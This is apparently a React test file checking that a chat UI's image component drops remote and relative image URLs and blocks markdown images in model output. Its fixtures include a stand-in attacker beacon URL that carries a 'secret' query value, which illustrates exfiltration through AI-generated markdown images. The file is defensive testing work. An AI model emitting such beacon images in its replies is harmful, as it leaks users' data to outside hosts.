import {
  MessageResponse,
  SafeMarkdownImage,
} from "@curio/ui/components/ai-elements/message";
import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

const DATA_IMAGE = "data:image/png;base64,AAAA";
const BLOB_IMAGE = "blob:https://curio.local/1234";
const REMOTE_IMAGE_MARKDOWN =
  "![x](https://attacker.example/leak?d=secret)";

describe("SafeMarkdownImage", () => {
  it("renders data: images", () => {
    render(<SafeMarkdownImage alt="inline" src={DATA_IMAGE} />);

    expect(screen.getByRole("img", { name: "inline" })).toHaveAttribute(
      "src",
      DATA_IMAGE
    );
  });

  it("renders blob: images", () => {
    render(<SafeMarkdownImage alt="preview" src={BLOB_IMAGE} />);

    expect(screen.getByRole("img", { name: "preview" })).toHaveAttribute(
      "src",
      BLOB_IMAGE
    );
  });

  it("drops remote https images", () => {
    const { container } = render(
      <SafeMarkdownImage
        alt="beacon"
        src="https://attacker.example/leak?d=secret"
      />
    );

    expect(container).toBeEmptyDOMElement();
  });

  it("drops relative images", () => {
    const { container } = render(
      <SafeMarkdownImage alt="beacon" src="//attacker.example/leak" />
    );

    expect(container).toBeEmptyDOMElement();
  });

  it("drops a missing src", () => {
    const { container } = render(<SafeMarkdownImage alt="beacon" />);

    expect(container).toBeEmptyDOMElement();
  });

  it("drops a non-string src", () => {
    const { container } = render(
      <SafeMarkdownImage
        alt="beacon"
        src={42 as unknown as string}
      />
    );

    expect(container).toBeEmptyDOMElement();
  });
});

describe("MessageResponse images", () => {
  it("does not emit remote images from model markdown", () => {
    const { container } = render(
      <MessageResponse>{REMOTE_IMAGE_MARKDOWN}</MessageResponse>
    );

    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("attacker.example");
  });
});
